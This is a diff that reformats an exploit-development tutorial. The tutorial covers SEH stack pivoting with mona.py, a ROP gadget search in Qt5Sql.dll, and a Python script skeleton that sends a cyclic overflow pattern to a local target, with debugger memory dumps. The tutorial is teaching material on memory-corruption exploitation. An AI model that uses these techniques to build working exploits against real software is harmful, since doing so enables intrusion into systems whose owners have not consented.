@@ -600,9 +600,13 @@ Comparing bytes from file with memory :
 <h3>4. Stack Pivoting</h3>
 <p align="justify">At this point we need to transfer the execution flow back to the stack area that we control. In order to do this we will use a technique called stack pivot. This action can be accomplished by observing the location of <b>ESP</b> register at the time <b>SEH</b> gets executed in relation to the location of our payload on the stack.</p>
 <p align="justify">Before searching any gadget, we should first use <b>mona.py</b> again, to search for modules with no restrictions</p>
-<pre>0:000&gt; !py mona modules
+
+```
+0:000> !py mona modules
 Hold on...
-[.....]</pre>
+[.....]
+```
+
 <p align="justify">If we take a closer look at the modules info table generated from mona, we can see that there are some specific modules with no restrictions at all. Furthermore we have identified one of these modules with no restrictions which is the <b>Qt5Sql.dll</b>. We can use this specific .dll in order to search for gadgets that can help us in stack pivoting.</p>
 
 ```
@@ -624,7 +628,7 @@ Gadgets information
 
 import struct
 import socket
-import sys<br />
+import sys
 target = "127.0.0.1"
 
 payload= "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A"
@@ -748,13 +752,13 @@ Qt5Sql+0x1011:
 0022d020  c8aa7b52 fffffffe 77b198da 005658d8
 0022d030  04ace4d8 00000002 00000004 00acf558
 0022d040  00acf564 00acef50 00000001 04ace4d8
-0022d050  <span style="color:#ff0000;">41306141</span> 61413161 33614132 41346141
+0022d050  41306141 61413161 33614132 41346141
 0022d060  61413561 37614136 41386141 62413961
 0022d070  31624130 41326241 62413362 35624134
 0022d080  41366241 62413762 39624138 41306341
 0022d090  63413163 33634132 41346341 63413563
 0022d0a0  37634136 41386341 64413963 31644130
-0:000&gt; !py mona pattern_offset 41306141 
+0:000> !py mona pattern_offset 41306141 
 Hold on...
 [+] Command used:
 !py C:\Program Files\Windows Kits\8.0\Debuggers\x86\mona.py pattern_offset 41306141
